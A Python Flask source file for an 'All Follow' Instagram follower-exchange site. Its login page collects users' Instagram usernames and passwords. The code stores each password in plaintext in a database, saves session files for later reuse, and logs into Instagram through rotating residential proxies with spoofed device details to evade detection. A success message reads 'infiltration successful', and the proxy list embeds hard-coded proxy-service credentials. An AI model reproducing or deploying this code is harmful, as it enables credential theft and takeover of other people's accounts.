import os, random, time, uuid, json
from flask import Flask, request, jsonify, session, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

# --- 1. UYGULAMA VE VERİTABANI TANIMLAMA ---
app = Flask(__name__)
app.secret_key = "all_follow_v15_secret"
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v15.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Session (Oturum) dosyaları için klasör oluştur
SESSION_FOLDER = "sessions"
if not os.path.exists(SESSION_FOLDER):
    os.makedirs(SESSION_FOLDER)

# --- 2. VERİTABANI MODELİ ---
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    coins = db.Column(db.Integer, default=10)

# --- 3. PROXY LİSTESİ ---
PROXY_LIST = [
    "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73263145:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    # Buraya diğerlerini de ekleyebilirsin...
]

# --- 4. ANA SAYFA (ARAYÜZ) ---
@app.route('/')
def index():
    html_content = """
    <html>
    <head><title>All Follow Login</title><script src="https://cdn.tailwindcss.com"></script></head>
    <body class="bg-black text-white flex items-center justify-center h-screen">
        <div class="w-96 p-8 bg-zinc-900 rounded-3xl border border-white/5">
            <h2 class="text-2xl font-black mb-6 text-center">ALL FOLLOW</h2>
            <div class="space-y-4">
                <input id="u" placeholder="Instagram Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none">
                <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none">
                <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase text-sm hover:bg-blue-700 transition">Giriş Yap</button>
                <p id="msg" class="text-xs text-center text-yellow-500 font-bold mt-4"></p>
            </div>
        </div>
        <script>
            async function login(){
                const u=document.getElementById('u').value, p=document.getElementById('p').value;
                const btn=document.getElementById('btn'), msg=document.getElementById('msg');
                if(!u || !p) { msg.innerText = "Alanları doldur!"; return; }
                
                btn.innerText="GİRİŞ YAPILIYOR...";
                btn.disabled = true;
                
                try {
                    const r = await fetch('/api/login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({u, p})
                    });
                    const d = await r.json();
                    msg.innerText = d.msg;
                    if(d.status === "success") {
                        setTimeout(() => { window.location.href = "/panel"; }, 1500);
                    }
                } catch(e) { msg.innerText = "Sunucu hatası!"; }
                btn.innerText = "Giriş Yap";
                btn.disabled = false;
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html_content)

# --- 5. LOGIN API (HATALARI DÜZELTİLMİŞ KISIM) ---
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    session_file = os.path.join(SESSION_FOLDER, f"{u}.json")
    
    cl = Client()
    
    # Proxy Ayarı (cl.proxies yerine cl.set_proxy kullanıyoruz)
    px = random.choice(PROXY_LIST)
    cl.set_proxy(px)
    cl.set_locale("tr_TR") # Proxy TR olduğu için önemli

    try:
        # Eski Oturum Varsa Yükle
        if os.path.exists(session_file):
            cl.load_settings(session_file)
            try:
                cl.get_timeline_feed()
                session['user'] = u
                return jsonify(status="success", msg="Oturum Yenilendi! ✅")
            except:
                os.remove(session_file)

        # Yeni Cihaz Tanımla
        cl.set_device({
            "app_version": "269.0.0.18.75",
            "android_version": 26,
            "device": "Samsung Galaxy S9",
            "device_id": str(uuid.uuid5(uuid.NAMESPACE_DNS, u)),
        })

        time.sleep(random.uniform(2, 4))
        
        if cl.login(u, p):
            cl.dump_settings(session_file) # Oturumu kaydet
            
            # Veritabanı Kaydı
            user = User.query.filter_by(username=u).first()
            if not user:
                user = User(username=u, password=p)
                db.session.add(user)
            db.session.commit()
            
            session['user'] = u
            return jsonify(status="success", msg="Sızma Başarılı! ✅")

    except Exception as e:
        err = str(e).lower()
        if "challenge" in err or "checkpoint" in err:
            return jsonify(status="error", msg="ONAY GEREKLİ! Telefona bak.")
        if "bad_password" in err:
            return jsonify(status="error", msg="ŞİFRE YANLIŞ!")
        return jsonify(status="error", msg="INSTAGRAM ENGELLEDİ! (Biraz bekle)")

# --- 6. ÇALIŞTIRMA ---
if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    # Render için portu 10000 yapıyoruz
    app.run(host="0.0.0.0", port=10000)
